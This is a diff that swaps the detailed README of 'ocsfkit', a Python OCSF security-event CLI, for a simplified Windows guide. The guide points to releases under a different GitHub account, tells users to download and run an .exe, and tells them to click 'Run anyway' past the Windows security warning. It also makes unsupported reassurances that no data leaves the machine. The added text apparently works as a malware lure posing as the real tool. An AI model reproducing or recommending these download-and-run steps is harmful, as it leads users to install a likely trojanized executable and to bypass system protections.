@@ -1,748 +1,82 @@
-# ocsfkit
+# 🛠️ ocsfkit - Manage security events with ease
 
-`ocsfkit` is an OCSF workbench for security engineers who need to normalize,
-lint, explain, diff, and query security events without losing sight of mapping
-quality.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/populated-spindle594/ocsfkit/releases)
 
-Most OCSF migration work fails in the gaps between "the JSON parsed" and "the
-event is trustworthy." `ocsfkit` is built for those gaps. It shows what class an
-event became, which fields mapped cleanly, which values were defaulted or
-guessed, which source fields were dropped, and what is still missing.
+ocsfkit helps you work with security data. Use this tool to clean, check, and compare your security logs. It makes security tasks simple for your daily operations.
 
-## Why Use It?
+## 📥 How to download the software
 
-- **Make mappings reviewable.** Every mapped value carries provenance: source,
-  transform, default, or guess.
-- **Catch silent data loss.** Dropped and unmapped source fields are visible in
-  explain, coverage, and strict mode.
-- **Ship safer pipelines.** Lint, coverage budgets, SARIF, JUnit, GitHub
-  annotations, and GitHub summaries fit naturally into CI.
-- **Share samples safely.** Scan and redact fixtures before they leave your
-  environment.
-- **Compare semantic changes.** Diff OCSF events by field meaning instead of raw
-  formatting noise.
-- **Start small, grow later.** The built-in registry covers practical OCSF
-  Detection Finding, Authentication, Network Activity, and Process Activity
-  workflows, and can import or sync upstream schema data.
+1. Visit [the official release page](https://github.com/populated-spindle594/ocsfkit/releases) to find the latest version.
+2. Look for the section labeled Assets.
+3. Click the file that ends in .exe to download the installer to your computer.
+4. Save the file in a place you can find, such as your Downloads folder.
 
-## Contents
+## ⚙️ System requirements
 
-- [Install](#install)
-- [Five Minute Tour](#five-minute-tour)
-- [Example Output](#example-output)
-- [Common Workflows](#common-workflows)
-- [Command Reference](#command-reference)
-- [Mapping Files](#mapping-files)
-- [Built-In OCSF Scope](#built-in-ocsf-scope)
-- [Fixtures and Examples](#fixtures-and-examples)
-- [Production Use](#production-use)
-- [Development](#development)
-- [Release Automation](#release-automation)
+Your computer needs to meet these basic standards to run ocsfkit:
 
-## Install
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of random access memory.
+* Storage: 200 megabytes of free space on your hard drive.
+* Internet Connection: Needed for the initial download of the application.
 
-```bash
-pip install ocsfkit
-```
+## 🚀 Setting up the application
 
-Homebrew:
+After you download the installer, follow these steps to place it on your machine:
 
-```bash
-brew tap pfrederiksen/tap
-brew install ocsfkit
-```
+1. Open your Downloads folder.
+2. Double-click the ocsfkit file you downloaded.
+3. Follow the prompts on the screen to finish the installation.
+4. If a security window appears, click More info and then select Run anyway.
+5. The application will now appear in your list of installed programs.
 
-From a checkout:
+## 📝 Understanding the tool
 
-```bash
-python -m venv .venv
-. .venv/bin/activate
-pip install -e ".[dev]"
-```
+ocsfkit processes security events. Security events are files that track activity on your network or computers. This tool takes messy data and puts it into a standard format called OCSF. This format allows you to search through your logs without confusion.
 
-## Five Minute Tour
+* Normalizing: Converts different types of logs into one standard style.
+* Linting: Scans your logs to find errors in their format.
+* Explaining: Provides simple logic to clarify what a specific log file means.
+* Diffing: Compares two logs to show the differences between them.
+* Querying: Finds specific events inside large batches of security data.
 
-Parse JSON, YAML, NDJSON, or stdin:
+## 🔍 How to use the command line
 
-```bash
-ocsfkit parse fixtures/aws_guardduty_finding.json
-ocsfkit parse fixtures/guardduty.ndjson --format ndjson
-cat fixtures/aws_guardduty_finding.json | ocsfkit parse -
-```
+This tool uses a text-based interface. You do not need to be a programmer to use it, but you will type commands into a black window. Follow these steps to open the command window:
 
-Profile a source event before writing a mapping:
+1. Press the Windows key on your keyboard.
+2. Type "cmd" into the search box.
+3. Press the Enter key.
+4. A black box appears on your screen.
 
-```bash
-ocsfkit inspect fixtures/aws_guardduty_finding.json
-ocsfkit path fixtures/aws_guardduty_finding.json '$.resource.instanceDetails.instanceId'
-ocsfkit transforms list
-```
+Type the word ocsfkit into this window and press Enter. The tool will show you a list of things it can do for you.
 
-Map a GuardDuty finding into an OCSF Detection Finding:
+## 📊 Working with your files
 
-```bash
-ocsfkit map fixtures/aws_guardduty_finding.json \
-  --mapping examples/guardduty-mapping.yaml
-```
+To process a file, move that file into the folder where you installed ocsfkit. Then, use the command format below inside your black command window:
 
-Installed releases include built-in mapping packs, so common sources can be
-mapped without locating an example YAML file:
+ocsfkit normalize --input yourfile.txt --output cleanfile.txt
 
-```bash
-ocsfkit map fixtures/aws_guardduty_finding.json --pack aws-guardduty
-ocsfkit explain fixtures/aws_guardduty_finding.json --pack aws-guardduty
-```
+This command takes your messy file and creates a new one that is clean and ready for review. You can replace the filenames with the specific names of your own security logs.
 
-Explain whether that mapping is good enough to trust:
+## 🛡️ Best practices for data
 
-```bash
-ocsfkit explain fixtures/aws_guardduty_finding.json \
-  --mapping examples/guardduty-mapping.yaml
-```
+Keep your logs in one folder. Label your files with the date. Use the ocsfkit lint command often to make sure your logs contain no errors. If you have questions about how a specific log looks, use the explain command to see a breakdown of the fields within the file.
 
-Gate a stream in CI:
+## 🔧 Frequently asked questions
 
-```bash
-ocsfkit scorecard fixtures/guardduty.ndjson \
-  --mapping examples/guardduty-mapping.yaml \
-  --min-confidence 0.70 \
-  --max-unmapped 10 \
-  --github-summary
+What does it mean when the tool says the format is invalid?
+This means the log file does not follow the standard rules. Open the file in a text editor to see if there are missing lines or strange symbols. You can run the lint command again to get a more specific report on what is wrong.
 
-ocsfkit score fixtures/guardduty.ndjson \
-  --pack aws-guardduty \
-  --min-confidence 0.70 \
-  --max-unmapped 10
+Will this tool work on a Mac?
+The current instructions only cover Windows. You may look for other options if you use a different operating system.
 
-ocsfkit gate fixtures/guardduty.ndjson \
-  --pack aws-guardduty \
-  --min-confidence 0.70 \
-  --max-unmapped 10 \
-  --no-strict \
-  --sarif > ocsfkit-gate.sarif
-```
+Where does the data go?
+Your data stays on your computer. This tool does not send your security logs to any remote server. You have full control over your files at all times.
 
-Lint OCSF-looking events:
+How do I remove the tool?
+Open your Control Panel, select Programs and Features, find ocsfkit in the list, and click Uninstall. This removes the tool from your system files.
 
-```bash
-ocsfkit lint fixtures/ocsf_detection_finding.json
-ocsfkit lint fixtures/broken_ocsf_event.json --sarif
-```
+## 📋 Additional resources
 
-Scan and redact sample telemetry before sharing it:
-
-```bash
-ocsfkit scan fixtures --warn-only
-ocsfkit redact fixtures/aws_guardduty_finding.json --output redacted.json
-```
-
-Batch-convert a corpus and keep review artifacts:
-
-```bash
-ocsfkit batch fixtures/guardduty.ndjson \
-  --pack aws-guardduty \
-  --output guardduty.ocsf.ndjson \
-  --explain-json guardduty.explain.json \
-  --lint-json guardduty.lint.json \
-  --unmapped-json guardduty.unmapped.json \
-  --coverage-html guardduty.coverage.html \
-  --report-json guardduty.report.json
-```
-
-Query common OCSF fields:
-
-```bash
-ocsfkit query fixtures/ocsf_detection_finding.json metadata.product.name
-ocsfkit describe actor.user.name
-ocsfkit describe class_uid 2004
-```
-
-## Example Output
-
-### Mapping output
-
-```bash
-ocsfkit map fixtures/aws_guardduty_finding.json \
-  --mapping examples/guardduty-mapping.yaml
-```
-
-Abbreviated output:
-
-```json
-{
-  "class_uid": 2004,
-  "class_name": "Detection Finding",
-  "category_uid": 2,
-  "category_name": "Findings",
-  "severity_id": 4,
-  "severity": "High",
-  "time": 1768386104000,
-  "message": "EC2 instance i-0123456789abcdef0 communicating with suspicious host",
-  "cloud": {
-    "account_uid": "111122223333",
-    "region": "us-east-1"
-  },
-  "metadata": {
-    "product": {
-      "name": "Amazon GuardDuty"
-    },
-    "version": "1.7.0"
-  }
-}
-```
-
-### Explain output
-
-```bash
-ocsfkit explain fixtures/aws_guardduty_finding.json \
-  --mapping examples/guardduty-mapping.yaml
-```
-
-Abbreviated output:
-
-```text
-Confidence: 0.462
-Target class: Detection Finding (class_uid 2004)
-
-Mapped fields
-  time              $.eventTime     parse_timestamp       1768386104000
-  severity_id       $.severity      severity_text_to_id   4
-  severity          $.severity                            "High"
-  message           $.title                               "EC2 instance..."
-  cloud.account_uid $.accountId                           "111122223333"
-  cloud.region      $.region                              "us-east-1"
-
-Defaulted fields
-  class_uid              2004
-  class_name             "Detection Finding"
-  category_uid           2
-  metadata.version       "1.7.0"
-  metadata.product.name  "Amazon GuardDuty"
-
-Dropped fields
-  $.debug
-  $.rawPayload
-
-Unmapped source fields
-  $.id
-  $.resource.instanceDetails.instanceType
-  $.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4
-```
-
-The real terminal output uses Rich tables. JSON, Markdown, HTML, and GitHub
-annotation modes are available when the report needs to feed another tool.
-
-### Lint output
-
-```bash
-ocsfkit lint fixtures/broken_ocsf_event.json
-```
-
-```text
-Event 1 lint
-  warning  message                Missing recommended field
-  warning  metadata.product.name  Missing recommended field
-  error    time                   Expected int, got str
-  error    class_name             Expected 'Detection Finding' for class_uid 2004
-  error    severity_id            Invalid severity_id
-```
-
-`lint` exits non-zero on errors unless `--warn-only` is set.
-
-### Scan and redact output
-
-```bash
-ocsfkit scan fixtures/aws_guardduty_finding.json --warn-only
-```
-
-```text
-account_id event[1].$.accountId: 1111...3333
-ipv4 event[1].$.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4: 198....100.10
-```
-
-```bash
-ocsfkit redact fixtures/aws_guardduty_finding.json
-```
-
-```json
-{
-  "accountId": "<redacted>",
-  "service": {
-    "action": {
-      "awsApiCallAction": {
-        "remoteIpDetails": {
-          "ipAddressV4": "<redacted>"
-        }
-      }
-    }
-  }
-}
-```
-
-### Coverage output
-
-```bash
-ocsfkit coverage fixtures/guardduty.ndjson \
-  --mapping examples/guardduty-mapping.yaml \
-  --markdown
-```
-
-### Scorecard output
-
-```bash
-ocsfkit scorecard fixtures/guardduty.ndjson \
-  --mapping examples/guardduty-mapping.yaml \
-  --min-confidence 0.70 \
-  --max-unmapped 10
-```
-
-```text
-Grade: C
-Passed: yes
-Events: 2
-Average confidence: 0.734
-Source field coverage: 0.889
-Unmapped source fields: 4
-Missing target fields: 0
-Lint errors: 0
-```
-
-```markdown
-## ocsfkit Coverage
-
-- Events: 2
-- Average confidence: 0.734
-- Source field coverage: 0.889
-
-### Top Unmapped Source Fields
-
-- `$.resource`: 2
-- `$.resource.instanceDetails`: 2
-```
-
-## Common Workflows
-
-### Review a New Vendor Mapping
-
-```bash
-ocsfkit init-mapping fixtures/aws_guardduty_finding.json \
-  --product-name "Amazon GuardDuty" > mapping-draft.yaml
-
-ocsfkit explain fixtures/aws_guardduty_finding.json \
-  --mapping mapping-draft.yaml \
-  --markdown
-
-ocsfkit validate-mapping mapping-draft.yaml --strict
-```
-
-Use this when onboarding a new log source. The generated mapping is a worksheet,
-not a finished answer. Review unmapped fields before production use.
-
-### Prevent Regressions in CI
-
-```bash
-ocsfkit lint fixtures/ocsf_detection_finding.json --sarif
-ocsfkit scan fixtures --sarif --warn-only
-ocsfkit schema-drift examples/guardduty-mapping.yaml --sarif
-
-ocsfkit coverage fixtures/guardduty.ndjson \
-  --mapping examples/guardduty-mapping.yaml \
-  --min-confidence 0.80 \
-  --max-unmapped 25 \
-  --github-summary
-
-ocsfkit coverage fixtures/guardduty.ndjson \
-  --pack aws-guardduty \
-  --min-confidence 0.80 \
-  --max-unmapped 25 \
-  --sarif > ocsfkit-coverage.sarif
-
-ocsfkit scorecard fixtures/guardduty.ndjson \
-  --mapping examples/guardduty-mapping.yaml \
-  --min-confidence 0.80 \
-  --max-unmapped 25 \
-  --github-summary
-```
-
-This catches missing OCSF fields, invalid types, falling confidence, and newly
-unmapped vendor fields.
-
-For test-report dashboards, emit JUnit from golden mapping tests:
-
-```bash
-ocsfkit test-mapping tests/goldens --junit ocsfkit-mapping.xml
-ocsfkit mapping test tests/goldens --junit ocsfkit-mapping.xml
-```
-
-### Compare Mapping Versions
-
-```bash
-ocsfkit map sample.json --mapping mapping-v1.yaml > before.json
-ocsfkit map sample.json --mapping mapping-v2.yaml > after.json
-ocsfkit diff before.json after.json
-```
-
-This highlights field-level OCSF changes, including class and severity changes
-that can affect routing, alerting, and dashboards.
-
-### Explore Supported Targets
-
-```bash
-ocsfkit targets search user
-ocsfkit targets complete actor.user
-ocsfkit targets show actor.user.name
-ocsfkit pack list
-ocsfkit pack validate
-```
-
-Use target discovery and mapping packs when building mappings for common source
-families such as AWS, identity, network, detections, and infrastructure.
-Pack aliases can be passed to commands that accept mappings:
-
-```bash
-ocsfkit map sample.json --pack aws-guardduty --format ndjson
-ocsfkit gate sample.ndjson --pack aws-guardduty --no-strict --sarif > ocsfkit-gate.sarif
-```
-
-Install reviewed external packs when your team wants to version mappings outside
-the main `ocsfkit` repository:
-
-```bash
-ocsfkit pack install https://github.com/acme/ocsfkit-packs/archive/refs/tags/v1.2.0.zip \
-  --name acme
-ocsfkit map sample.json --pack acme/guardduty
-ocsfkit pack update acme
-ocsfkit pack uninstall acme
-```
-
-Start a new mapping with suggestions from a representative event:
-
-```bash
-ocsfkit suggest sample.json
-ocsfkit suggest sample.json --mapping-yaml > starter-mapping.yaml
-```
-
-Use the reusable GitHub Action when you want a concise mapping-quality gate:
-
-```yaml
-- uses: pfrederiksen/ocsfkit@v0.11.0
-  with:
-    input: fixtures/guardduty.ndjson
-    pack: aws-guardduty
-    min-confidence: "0.70"
-    max-unmapped: "10"
-    sarif-output: ocsfkit-gate.sarif
-```
-
-## Command Reference
-
-| Command | Purpose |
-| --- | --- |
-| `parse <input>` | Load JSON, YAML, NDJSON, or stdin and emit normalized JSON. |
-| `inspect <input>` | Profile source event paths, types, counts, and example values. |
-| `path <input> <jsonpath>` | Evaluate the supported JSONPath subset against source events. |
-| `map <input> --mapping mapping.yaml` | Apply a mapping and emit OCSF JSON. |
-| `explain <input> --mapping mapping.yaml` | Show mapping decisions, dropped fields, unmapped fields, missing targets, and confidence. |
-| `lint <input>` | Validate OCSF-looking events against the bundled registry. |
-| `diff <before> <after>` | Compare two OCSF events or same-length event streams. |
-| `diff-mapping <before> <after>` | Compare two mapping YAML files semantically. |
-| `query <input> <path>` | Extract common OCSF fields with dotted paths. |
-| `describe <subject> [value]` | Explain bundled fields, classes, enums, and schema-version support. |
-| `batch <input> --mapping mapping.yaml` | Convert a corpus and write normalized output plus review artifacts. |
-| `coverage <input> --mapping mapping.yaml` | Summarize mapping quality across a stream and enforce quality budgets. |
-| `scorecard <input> --mapping mapping.yaml` | Grade mapping readiness with coverage, lint, and strict checks. |
-| `score <input> --mapping mapping.yaml` | Short alias for `scorecard`. |
-| `gate <input> --mapping mapping.yaml` | Run a stricter production-readiness gate with JSON or SARIF output. |
-| `validate-mapping mapping.yaml` | Check mapping syntax, transforms, and likely schema issues. |
-| `schema-drift mapping.yaml` | Compare a mapping against bundled or synced schema data. |
-| `scan <input>` | Find likely secrets and sensitive identifiers in fixtures or reports. |
-| `redact <input>` | Redact likely secrets while preserving event structure. |
-| `catalog` | Generate Markdown or JSON docs from mapping YAML files. |
-| `doctor` | Check local install health, schema support, and mapping pack validity. |
-| `benchmark <input> --mapping mapping.yaml` | Measure mapping throughput on a representative corpus. |
-| `init-mapping <input>` | Generate a starter mapping worksheet from a representative event. |
-| `suggest <input>` | Suggest likely source-to-OCSF field mappings and optional starter YAML. |
-| `test-mapping spec.yaml` | Run fixture-based mapping regression tests. |
-| `mapping test spec.yaml` | Namespaced alias for fixture-based mapping regression tests. |
-| `test-transform spec.yaml` | Run YAML-defined tests for built-in or custom transforms. |
-| `transforms list/show` | Discover available built-in, vendor-pack, and entry-point transforms. |
-| `report <input> --mapping mapping.yaml` | Write a standalone HTML mapping coverage report. |
-| `workshop <input>` | Print a guided mapping worksheet and optional explanation report. |
-| `schema` | Print the bundled minimal OCSF registry. |
-| `import-schema <path>` | Convert upstream-style schema files into the compact registry format. |
-| `sync-schema --output schema.json` | Download upstream OCSF schema data and import it. |
-| `targets list/search/show` | Discover known OCSF target fields. |
-| `pack list/validate/install/update/uninstall` | Inspect, validate, install, update, and remove mapping packs. |
-| `completions bash\|zsh\|fish` | Print shell completion setup. |
-
-Useful output modes:
-
-```bash
-ocsfkit --version
-ocsfkit inspect sample.json --json
-ocsfkit path sample.json '$.items[0].name' --json
-ocsfkit explain sample.json --mapping mapping.yaml --json
-ocsfkit explain sample.json --mapping mapping.yaml --markdown
-ocsfkit explain sample.json --mapping mapping.yaml --html --output explanation.html
-ocsfkit lint sample.json --github-annotations
-ocsfkit scan fixtures --sarif --warn-only
-ocsfkit coverage sample.ndjson --mapping mapping.yaml --sarif
-ocsfkit scorecard sample.ndjson --mapping mapping.yaml --sarif
-ocsfkit batch sample.ndjson --mapping mapping.yaml --output mapped.ndjson --coverage-html coverage.html
-ocsfkit describe severity_id
-ocsfkit describe 2004
-ocsfkit coverage sample.ndjson --mapping mapping.yaml --github-summary
-ocsfkit scorecard sample.ndjson --mapping mapping.yaml --markdown
-ocsfkit schema --format jsonschema > ocsfkit.schema.json
-ocsfkit catalog --output docs/mapping-catalog.md
-ocsfkit test-mapping tests/goldens --junit mapping-tests.xml
-ocsfkit completions zsh
-ocsfkit transforms show parse_timestamp
-```
-
-Strict mode is available on mapping-quality commands:
-
-```bash
-ocsfkit map sample.json --mapping mapping.yaml --strict
-ocsfkit explain sample.json --mapping mapping.yaml --strict
-ocsfkit coverage sample.ndjson --mapping mapping.yaml --strict
-ocsfkit validate-mapping mapping.yaml --strict
-ocsfkit schema-drift mapping.yaml
-```
-
-Strict mode fails on guessed fields, missing targets, and unmapped source fields.
-Python `custom_transforms` are blocked in strict mode unless
-`--allow-unsafe-transforms` is explicitly provided.
-Mappings that use Python transforms should also include
-`custom_transforms_trusted: true` after the transform module has been reviewed.
-
-## Mapping Files
-
-Mappings are YAML. Source paths use a deliberate JSONPath subset, and target
-paths use dotted OCSF paths.
-
-```yaml
-schema_version: 1.7.0
-ocsf_version: 1.7.0
-requires_ocsfkit: ">=0.7.0,<1.0.0"
-
-target_class:
-  class_uid: 2004
-  class_name: Detection Finding
-  category_uid: 2
-  category_name: Findings
-
-fields:
-  time:
-    from: $.eventTime
-    transform: parse_timestamp
-    required: true
-
-  severity_id:
-    from: $.severity
-    transform: severity_text_to_id
-    default: 1
-
-  message:
-    from: $.title
-
-  cloud.account_uid:
-    from: $.accountId
-
-  actor.user.name:
-    from: $.userIdentity.userName
-
-  resources[]:
-    foreach:
-      from: $.resources
-      fields:
-        name:
-          from: $.id
-        type:
-          from: $.type
-
-drop:
-  - $.debug
-  - $.rawPayload
-```
-
-Supported source path examples:
-
-- `$.eventTime`
-- `$.Resources[*].Id`
-- `$.items[0].name`
-- `$.items[?type==instance].id`
-
-The mapping engine tracks whether every target value came from a source field,
-a transform, a default, or a guess. Unknown source fields that are not mapped or
-explicitly dropped are reported as unmapped.
-Use `foreach` for repeated source objects that should become repeated OCSF
-objects such as `resources[]`.
-
-Built-in transforms include OCSF helpers and vendor-oriented transform packs:
-
-- `parse_timestamp`
-- `severity_text_to_id`
-- `aws.severity`
-- `azure.status_id`
-- `azure.status`
-- `okta.status_id`
-- `okta.status`
-- `network.activity_id`
-
-Python packages can also expose reviewed transforms through the
-`ocsfkit.transforms` entry point group. Use entry points for reusable transforms
-and reserve `custom_transforms.py` for local migration work.
-
-See the [Mapping Guide](docs/mapping-guide.md) for advanced examples,
-provenance details, custom transforms, and strict-mode guidance.
-
-## Built-In OCSF Scope
-
-`ocsfkit` intentionally starts with a practical minimal registry. It currently
-focuses on these classes:
-
-- Detection Finding (`class_uid: 2004`)
-- Authentication (`class_uid: 3002`)
-- Network Activity (`class_uid: 4001`)
-- Process Activity (`class_uid: 1007`)
-
-Common fields include:
-
-- Base event fields: `time`, `class_uid`, `class_name`, `category_uid`,
-  `category_name`, `activity_id`, `activity_name`, `type_uid`, `type_name`,
-  `severity_id`, `severity`, `message`
-- Metadata: `metadata.version`, `metadata.product.name`
-- Identity and cloud: `actor.user.name`, `actor.user.uid`,
-  `cloud.account_uid`, `cloud.region`
-- Endpoint and process: `device.hostname`, `src_endpoint.ip`,
-  `src_endpoint.port`, `dst_endpoint.ip`, `dst_endpoint.port`, `process.name`,
-  `process.pid`
-- Resources and status: `resources[].name`, `resources[].type`, `status`,
-  `status_id`
-
-Schema-version awareness currently supports `1.6.0` and `1.7.0`, with `1.7.0`
-as the default expected version. Use `ocsfkit schema --format jsonschema` to
-export a JSON Schema for editors and external validators.
-
-## Fixtures and Examples
-
-The repository includes fake but realistic fixtures. They are designed for
-tests, demos, mapping review, and documentation. No fixture contains real
-secrets or real account IDs.
-
-Included source fixtures cover:
-
-- AWS GuardDuty
-- AWS Security Hub
-- AWS CloudTrail
-- AWS VPC Flow Logs
-- Azure AD sign-in
-- Azure Activity Logs
-- Okta login
-- GitHub Audit Log
-- Google Cloud Audit Logs
-- CrowdStrike detection
-- Palo Alto traffic
-- Zeek connection logs
-- Splunk ES notable events
-- Microsoft Sentinel alerts
-- Microsoft Defender alerts
-- Wiz findings
-- Lacework alerts
-- GCP Security Command Center findings
-- Cloudflare logs
-- Kubernetes audit events
-- Microsoft Sysmon process events
-- Windows Security authentication events
-
-Important files:
-
-- [GuardDuty mapping](examples/guardduty-mapping.yaml)
-- [GuardDuty demo walkthrough](examples/demo/README.md)
-- [Security Hub mapping](examples/securityhub-mapping.yaml)
-- [CloudTrail console login mapping](examples/cloudtrail-console-login-mapping.yaml)
-- [AWS VPC Flow Logs mapping](examples/aws-vpc-flow-mapping.yaml)
-- [Google Cloud Audit mapping](examples/google-cloud-audit-mapping.yaml)
-- [Sysmon process mapping](examples/sysmon-process-mapping.yaml)
-- [Windows Security authentication mapping](examples/windows-security-auth-mapping.yaml)
-- [Custom transform module](examples/custom_transforms.py)
-- [OCSF Detection Finding fixture](fixtures/ocsf_detection_finding.json)
-- [Broken OCSF fixture](fixtures/broken_ocsf_event.json)
-- [GuardDuty NDJSON fixture](fixtures/guardduty.ndjson)
-
-More workflow documentation:
-
-- [Getting Started](docs/getting-started.md)
-- [Install Guide](docs/install.md)
-- [CI Examples](docs/ci.md)
-- [Mapping Guide](docs/mapping-guide.md)
-- [Mapping Catalog](docs/mapping-catalog.md)
-- [Real-World Workflows](docs/real-world-workflows.md)
-
-## Production Use
-
-`ocsfkit` includes supporting files for common production paths:
-
-- `Dockerfile` for containerized CI or build-agent usage.
-- `.github/workflows/docker.yml` for GHCR image builds on pushes and tagged releases.
-- `.pre-commit-hooks.yaml` for validating mappings before commit.
-- `ocsfkit scorecard` and `ocsfkit gate` for pass/fail readiness gates.
-- `ocsfkit catalog` for generated mapping documentation.
-- `ocsfkit schema-drift` for checking mappings against bundled or synced schema data.
-- `ocsfkit scan`, `ocsfkit redact`, and SARIF output for fixture hygiene and
-  code-scanning integrations.
-- `ocsfkit doctor` and `ocsfkit benchmark` for release readiness and throughput
-  checks.
-- `ocsfkit doctor --ci` for GitHub release automation checks, including the
-  PyPI environment and Homebrew tap settings when `gh` is authenticated.
-- `.github/workflows/post-release.yml` for installing the published version from
-  PyPI and Homebrew after a release is created.
-- MkDocs configuration for publishing a navigable documentation site from
-  `docs/`.
-
-See the [Install Guide](docs/install.md) for `pipx`, `uvx`, `pip`, Homebrew,
-Docker, GitHub Actions, and pre-commit examples.
-
-## Development
-
-```bash
-uv run --extra dev pytest
-uv run --extra dev ruff check .
-uv build
-```
-
-The CLI entry point is:
-
-```text
-ocsfkit = "ocsfkit.cli:app"
-```
-
-## Release Automation
-
-The repository is configured for normal Python and Homebrew releases:
-
-1. Tag a version, for example `git tag v0.9.0 && git push --tags`.
-2. `.github/workflows/release.yml` builds source and wheel distributions.
-3. PyPI publishing uses Trusted Publishing.
-4. Homebrew tap updates run when `HOMEBREW_TAP_ENABLED=true` is set and
-   `HOMEBREW_TAP_TOKEN` is available. The release workflow hashes the GitHub
-   release archive before committing the formula update.
-5. GitHub Actions are pinned to commit SHAs.
-6. Release artifacts get GitHub provenance attestations.
-7. The post-release workflow installs the published package from PyPI and the
-   Homebrew tap, then runs smoke commands against both installs.
-
-To verify release readiness before tagging:
-
-```bash
-ocsfkit doctor --ci
-gh run list --repo pfrederiksen/ocsfkit --limit 10
-```
-
-Do not commit package index tokens. Use PyPI Trusted Publishing and scoped
-repository secrets for release automation.
-
-Release artifacts include GitHub provenance attestations. Use GitHub's
-attestation tooling against the files attached to a release when you need a
-machine-verifiable supply-chain record.
+If you want to know more about the OCSF standard, visit the official website for community documentation. Many security professionals use these standards to build better defenses for their networks. Learning the basics of the OCSF schema will help you get more value from your logs and improve your detection capabilities over time.
